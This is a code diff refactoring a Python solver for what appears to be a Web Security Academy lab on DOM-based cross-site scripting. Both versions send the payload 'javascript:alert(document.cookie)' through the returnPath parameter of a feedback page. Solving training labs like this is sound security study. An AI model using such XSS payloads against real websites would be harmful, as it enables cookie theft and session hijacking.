@@ -1,16 +1,9 @@
-from web_security_academy.core.utils import *
-from urllib.parse import urljoin
-
-import requests
+from web_security_academy.core.logger import logger
 
 
-def solve_lab(url, proxies):
-    url = urljoin(url, "/feedback")
-    params = {"returnPath": "javascript:alert(document.cookie)"}
-    print_info(
-        f'Performing DOM-based XSS attack by visiting "{url}" with the following parameters:'
-    )
-    print(params)
+def solve_lab(session):
+    xss = "javascript:alert(document.cookie)"
 
-    requests.get(url, params=params, proxies=proxies, verify=False)
-    print_success("DOM-based XSS attack performed.\n")
+    path = f"/feedback?returnPath={xss}"
+    session.get_path(path)
+    logger.info(f'Visited path "{path}"')
